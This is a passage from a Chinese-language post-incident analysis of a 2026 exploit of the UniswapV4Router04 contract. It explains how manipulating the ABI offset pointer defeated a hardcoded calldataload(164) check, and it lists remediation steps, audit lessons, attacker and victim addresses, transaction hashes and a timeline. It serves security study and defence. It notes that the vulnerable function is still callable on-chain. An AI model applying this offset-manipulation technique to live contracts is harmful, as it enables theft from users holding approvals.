由于链上合约不可修改，唯一的修复方式是消除攻击的前提条件（用户授权）：

1. **用户侧**：所有曾对 Router04 approve 过 token 的用户应立即撤销授权（调用 `token.approve(0x00000000000044a361Ae3cAc094c9D1b14Eece97, 0)`）。
2. **项目方侧**：发布安全公告，明确告知用户该路由合约存在未修复的链上漏洞，并提供批量撤销授权的工具或指引。
3. **前端侧**：如有 DApp 前端仍引导用户对 Router04 进行 approve，应立即移除或切换至安全的路由合约。

## 9. 总结与启示

### 9.1 对 DeFi 开发者

**`calldataload` 硬编码偏移是一类危险的反模式。** 在 inline assembly 中使用 `calldataload(N)` 读取特定参数时，隐含假设了 calldata 的布局——特别是动态类型（`bytes`、`string`、动态数组）的偏移指针为标准值。然而 ABI 编码规范允许偏移指针为任意有效值，攻击者可以通过修改偏移指针在 `calldataload(N)` 的读取位置和实际参数位置之间制造分离。

**防御建议：**
- 避免在 assembly 中使用 `calldataload` 访问动态类型参数的内部字段。
- 如必须使用 inline assembly 进行优化，应先读取偏移指针并据此计算目标字段的实际位置，而非假设固定布局。
- 或者直接使用 Solidity 的 `abi.decode`——编译器生成的解码逻辑会正确跟随偏移指针。

### 9.2 对安全审计

**本案最令人警醒的事实：Router04 经过了 3 次独立审计（33audits、Kaden、Kupia），无一发现此漏洞。**

Parser differential 是一类需要特别关注的漏洞模式：同一输入数据被系统中的不同组件以不同方式解析。在本案中，校验逻辑（`calldataload`）和执行逻辑（`abi.decode`）对同一段 calldata 的解析产生了分歧。这类漏洞难以发现的原因在于——它不是逻辑错误，两套解析逻辑各自都是正确的，漏洞存在于它们之间的语义假设不一致。

审计时应重点检查：
- **inline assembly 与 ABI 解码器的一致性**：assembly 中对 calldata/memory 的直接读取是否与 Solidity `abi.decode` 的行为等价。任何使用 `calldataload` 读取动态类型（`bytes`、`string`、数组）内部字段的代码都应标记为高风险。
- **偏移指针的可控性**：当函数接受 `bytes calldata` 等动态类型参数时，是否存在通过修改偏移指针绕过校验的可能。
- **注释与实现的一致性**：源码注释声称 `calldataload(164)` 等价于 `abi.decode`——审计师是否验证了这一等价关系，还是信任了注释？
- **Gas 优化代码的安全审查深度**：开发者为节省几十 gas 而引入的 inline assembly "快捷方式"，往往是安全审计最容易忽略的角落。

### 9.3 对 DeFi 生态的信任模型

本案暴露了 DeFi 生态中几个常见的信任假设失效：

**Grant 资助 ≠ 官方背书 ≠ 安全保证。** Router04 由 Uniswap Foundation 资助开发，但它不是 Uniswap 官方产品。用户可能因为看到 "Uniswap Foundation" 字样而过度信任，对一个标注 "as-is" 的社区合约授权了大额 token。受害者对 Router04 的 USDC 和 USDT 均授予了 `type(uint256).max` 无限授权——这是对合约安全性的完全信任。

**多次审计 ≠ 无漏洞。** 3 次独立审计均未发现 `calldataload(164)` 漏洞。这并不意味审计无用，而是说明：审计的覆盖范围有限，尤其对 inline assembly 中的 Gas 优化代码，审计师可能依赖源码注释而非独立验证语义等价性。

**社区路由器被赋予生产级信任。** Router04 由 Uniswap Foundation 资助并定位为开发者友好的社区路由器，835 个用户中有人授权了大额 ERC20（受害者 $42,607 USDC + $25,575 USDT），远超测试用途。这反映了 DeFi 中合约定位与用户实际信任程度之间的鸿沟——Foundation grant、3 次审计、Etherscan 验证源码，这些信号叠加足以让用户产生"安全"的判断，但合约的实际安全性并不由这些信号决定。

### 9.4 对不可变合约的安全治理

本案暴露了一个深层的生态困境：**GitHub 修复 ≠ 链上修复。**

对于不可升级的合约，源码仓库中的 bug 修复仅影响未来的部署，不影响已部署的实例。当开发者在 GitHub 删除漏洞代码并认为问题已解决时，链上的漏洞合约可能仍在继续服务用户。

这意味着：
- 安全事件响应不能止步于代码修复——必须同步处理链上已部署实例的风险（用户通知、授权撤销、前端迁移）。
- 不可升级合约的漏洞本质上是永久性的，只能通过消除外部依赖（如撤销 token 授权）来缓解，无法根治。
- 审计不可升级合约时应采用更高的安全标准——部署后没有补救机会。

### 9.5 研究局限性

- 全量用户扫描覆盖了 5 种主流 token（USDC、USDT、WETH、DAI、WBTC）和 3 种已知在 Router04 上交易的 meme token，但无法穷举所有 ERC20 token。可能存在用户通过其他未检查的 token 对 Router04 持有授权。
- 扫描仅覆盖直接与 Router04 交互过的 835 个地址。如果用户通过聚合器（如 1inch、Cowswap）间接使用 Router04 并在此过程中进行了 approve，则该用户不在扫描范围内。
- 链上状态为 2026-04-22 的快照，不代表未来状态。
- 审计报告（33audits、Kaden、Kupia）的审计时间已根据 PDF 内容核实，但未深入分析各报告的具体审计范围和发现。
- z0r0z (Ross) 的背景信息来源于其 GitHub 公开主页和 Uniswap Foundation 博客，未经本人确认。
- 攻击者身份和动机为链上数据推测，无链下信息佐证。

### 9.6 声明

本文为事后分析（post-incident analysis），非漏洞首次发现或负责任披露。该漏洞已于 2026-03-03 被公开利用，项目方（z0r0z）已在攻击当天通过 GitHub commit 响应。本文撰写过程中，全量用户扫描确认当前无用户处于实际风险中。本文所有分析基于公开的链上数据和开源代码，不涉及任何非公开信息。

## 附录

### A. 关键地址与交易哈希

**合约地址：**

| 角色 | 地址 |
|---|---|
| 攻击合约 | [`0xdEd262d0A933b7BB4Ed8C4B6cb2dcE5b157B74A0`](https://etherscan.io/address/0xdEd262d0A933b7BB4Ed8C4B6cb2dcE5b157B74A0) |
| Copycat 合约 | [`0x475d94166117Ac741571F46ddEF770e68ca22C01`](https://etherscan.io/address/0x475d94166117Ac741571F46ddEF770e68ca22C01) |
| MEV 竞争者合约 | [`0x339c0db4A0030c88b4A48aafE56CdBa23c8d4338`](https://etherscan.io/address/0x339c0db4A0030c88b4A48aafE56CdBa23c8d4338) |
| UniswapV4Router04 | [`0x00000000000044a361Ae3cAc094c9D1b14Eece97`](https://etherscan.io/address/0x00000000000044a361Ae3cAc094c9D1b14Eece97) |
| Uniswap V4 PoolManager | [`0x000000000004444c5dc75cB358380D2e3dE08A90`](https://etherscan.io/address/0x000000000004444c5dc75cB358380D2e3dE08A90) |
| Permit2 | [`0x000000000022D473030F116dDEE9F6B43aC78BA3`](https://etherscan.io/address/0x000000000022D473030F116dDEE9F6B43aC78BA3) |
| USDC | [`0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48`](https://etherscan.io/address/0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48) |
| USDT | [`0xdAC17F958D2ee523a2206206994597C13D831ec7`](https://etherscan.io/address/0xdAC17F958D2ee523a2206206994597C13D831ec7) |

**EOA 地址：**

| 角色 | 地址 |
|---|---|
| 攻击者 | [`0xd6B7e831D64e573278f091AA7E68Fbf2A8FA9916`](https://etherscan.io/address/0xd6B7e831D64e573278f091AA7E68Fbf2A8FA9916) |
| 受害者 | [`0x65A8F07Bd9A8598E1b5B6C0a88F4779DBC077675`](https://etherscan.io/address/0x65A8F07Bd9A8598E1b5B6C0a88F4779DBC077675) |
| Copycat | [`0xf9572fa0a2ac1a174824c12b3e2eddddaf26bc94`](https://etherscan.io/address/0xf9572fa0a2ac1a174824c12b3e2eddddaf26bc94) |
| MEV 竞争者 | [`0xf33cdbef0e61b0cd5f74a2ad2bfa297b4224a14a`](https://etherscan.io/address/0xf33cdbef0e61b0cd5f74a2ad2bfa297b4224a14a) |

**交易哈希：**

| 交易 | 哈希 | 区块 | 状态 |
|---|---|---|---|
| Router04 部署 | [`0xc2e54c65...523a0880`](https://etherscan.io/tx/0xc2e54c650e1dd4880265b0267f12f2214675681bd1f8852dc7d6d80e523a0880) | 22281170 | SUCCESS |
| 攻击合约部署 | [`0xe27dda04...aa47e1`](https://etherscan.io/tx/0xe27dda04a4bf8e83841f3136866a0f1115807d20b3702de141d920fc57aa47e1) | 24575075 | SUCCESS |
| 攻击执行 | [`0xfe34c4be...b466a`](https://etherscan.io/tx/0xfe34c4beee447de536bbd3d613aa0e3aa7eeb63832e9453e4ef3999924ab466a) | 24575085 | SUCCESS |
| Copycat #1 (USDT) | [`0xa10117f7...834d`](https://etherscan.io/tx/0xa10117f747b0db021d3b643c3cd95e2b111410582ec047768ff5903cd2a8834d) | 24575218 | REVERTED |
| Copycat #2 (USDT) | [`0xb2eafd17...dc3`](https://etherscan.io/tx/0xb2eafd17515e2775c34a142f6c61daaae26aeb71ab064c544def142146676dc3) | 24575221 | REVERTED |
| Copycat #3 (USDC) | [`0x472a7710...f775`](https://etherscan.io/tx/0x472a7710e41d7f3a938209048f7fc97fdefcaf99eebecf52f3744ec7a07ef775) | 24575278 | REVERTED |
| Copycat #4 (USDC) | [`0xd863c08e...1e7c`](https://etherscan.io/tx/0xd863c08ea4a461102465af0c56fa31171179b307ab618b6298d324aad1de1e7c) | 24575718 | REVERTED |
| Copycat #5 (USDC) | [`0xff0251fc...128b`](https://etherscan.io/tx/0xff0251fc7aa4a629dec5303e855acc44740043cdc4898e8c3507ebc61fe4128b) | 24575872 | REVERTED |

### B. 研究方法论与工具链

| 工具 | 用途 |
|---|---|
| `cast code` / `cast codehash` | Bytecode 提取与比对 |
| `cast run --trace` | 攻击交易 EVM opcode 级 execution trace（核心突破口） |
| `cast storage` | Storage slot 检查 |
| `cast call --trace --block` | 指定区块状态下的模拟执行与 trace |
| `cast 4byte` / OpenChain / 4byte.directory | 函数签名查询（三库并行） |
| Heimdall | Runtime bytecode 反编译 |
| Foundry (`forge test --fork-url`) | Mainnet fork replay 验证 |
| `vm.rollFork(txHash)` | 精确恢复攻击前链上状态 |
| `vm.etch` | 运行时替换合约字节码用于对比测试 |
| Etherscan API v2 | 交易历史、token 转账记录查询 |
| JSON-RPC batch calls | 835 用户全量 allowance 扫描 |
| Phalcon (BlockSec) | 交易调用图可视化 |

### C. 漏洞生命周期

```
时间                    事件
─────────────────────────────────────────────────────
2025-04-10              最后一次审计（Kupia）完成
                        此前已完成 33audits、Kaden 两轮审计
                        三次审计均未发现 calldataload(164) 漏洞

2025-04-16 11:10 UTC    UniswapV4Router04 通过 CREATE2 工厂部署至以太坊主网
                        部署交易: 0xc2e54c65...dc7d6d80e523a0880
                        漏洞函数 swap(bytes,uint256) 上线
                        合约在 Etherscan 验证源码

                        ↓ 漏洞存活 320 天（10.7 个月）未被发现 ↓

2026-03-03 06:17 UTC    漏洞被利用 — $42,607 被盗
2026-03-03 06:19 UTC    赃款通过 Railgun 洗钱
2026-03-03 06:43 UTC    Copycat 开始尝试利用同一漏洞（全部失败）
2026-03-03 08:50 UTC    z0r0z 在 GitHub 删除漏洞函数源码（commit 0cd5187）
                        README 添加安全警告，建议用户撤销授权

2026-04-23              分析时点：
                        - 链上 bytecode 未变，漏洞函数仍可调用
                        - 835 个用户中 4 个有授权，但余额均为 0
                        - Router04 仍在活跃使用其他函数
                        - 漏洞将永久存在于链上
```
